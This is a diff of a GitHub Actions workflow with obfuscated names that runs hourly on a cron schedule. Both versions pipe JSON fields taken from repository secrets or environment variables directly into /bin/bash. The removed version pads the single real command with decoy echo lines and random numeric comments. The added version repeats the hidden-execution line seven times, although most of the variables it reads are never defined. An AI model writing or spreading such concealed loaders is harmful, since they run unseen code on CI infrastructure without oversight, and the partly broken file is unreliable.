@@ -1,37 +1,23 @@
-name: luzhishen5678 #6009
-on: #27413
-  workflow_dispatch: #31130
-  schedule: #27398
-    - cron: '2 5/6 * * *' #14692
-jobs:  # 22279
-  build: #15172
-    runs-on: ubuntu-latest #25125
-    steps: #11248
-      - uses: actions/checkout@v4 #14478
-      - name: luzhishen5678 #20466
-        env: #22322
-          v13092: ${{ secrets.v13092 }} #16236
+name: luzhishen5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luzhishen5678
+        env:
+          pg89195: ${{ secrets.pg89195 }}
         run: |
-          echo $v13092 | jq -r .u3107 | /bin/bash #8745
-          echo "String slice: str=abcdef; echo \${str:0:3}"
-          which bash 2>/dev/null || echo "Bash not in path"
-          echo "Sed mock: echo 'text' | sed 's/t/T/' 2>/dev/null || echo no-sed"
-          echo "Read mock: read -p 'Prompt' var <<< 'input'"
-          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
-          echo "Random ID: $RANDOM$RANDOM"
-          echo "Trap mock: trap 'echo TRAP' EXIT"
-          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
-          echo "Time diff mock: echo \$SECONDS"
-          : ' Another single-line comment '
-          echo "Version: $((1 + RANDOM % 5))"
-          if [ -x /bin/ls ]; then echo "LS executable"; fi
-          [ $RANDOM -gt 1000 ] && echo "Random passed"
-          echo "Wget mock: wget -qO- http://example.com 2>/dev/null | head -1 || echo no-wget"
-          echo "Env vars: $(env | wc -l) total"
-          echo "Command sub: $(echo inside subshell)"
-          echo "Socket test: echo 'socket-check'"
-          ls -la 2>/dev/null || true
-          echo "Process check: $(ps -ef | wc -l 2>/dev/null || echo 0)"
-          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
-          echo "Command group: { echo group; }"
-          echo "Stderr dump: ls /nonexist 2>&1 | head -1 || true"
+          echo $pg89195 | jq -r .yl3 | /bin/bash
+          echo $bg1 | jq -r .oxhv1441 | /bin/bash
+          echo $p6 | jq -r .rrxv214 | /bin/bash
+          echo $j15550 | jq -r .bvlt02 | /bin/bash
+          echo $xbgow4 | jq -r .rnxzb513 | /bin/bash
+          echo $qliw9 | jq -r .ayfu53 | /bin/bash
+          echo $mkr6324 | jq -r .j31959 | /bin/bash
+
